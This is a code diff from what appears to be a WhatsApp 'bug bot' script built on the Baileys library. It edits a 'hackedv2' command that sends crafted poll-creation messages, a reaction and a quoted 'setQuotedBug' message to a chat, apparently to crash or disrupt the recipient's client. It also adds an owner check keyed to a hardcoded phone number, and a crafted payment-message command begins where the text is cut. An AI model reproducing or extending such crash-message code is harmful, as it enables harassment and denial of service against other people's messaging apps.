@@ -554,10 +554,13 @@ xinn.sendMessage(from, { delete: {
 break
 
 case 'hackedv2':
-var bugreact = xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: m.id } } })
+{
+if (!isRegist) return onlyRegist()
+if (!isOwner && !xinn.key.fromMe) return onlyOwner('6282143067466') 
+var bugreact = await xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: xinn.id } } })
 var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "POWERED BY XINN", 
+"name": "HALO DEKK 🥶", 
 "options": [
    {
 "optionName": "VOTE YUK"
@@ -577,9 +580,10 @@ var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
 ], 
 "selectableOptionsCount": 5
   }
-}), { userJid: from, quoted: m })
+}), { userJid: from, quoted: setQuotedBug })
 xinn.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
 xinn.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
+}
 break
 case 'linkgroupoffc':
  var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
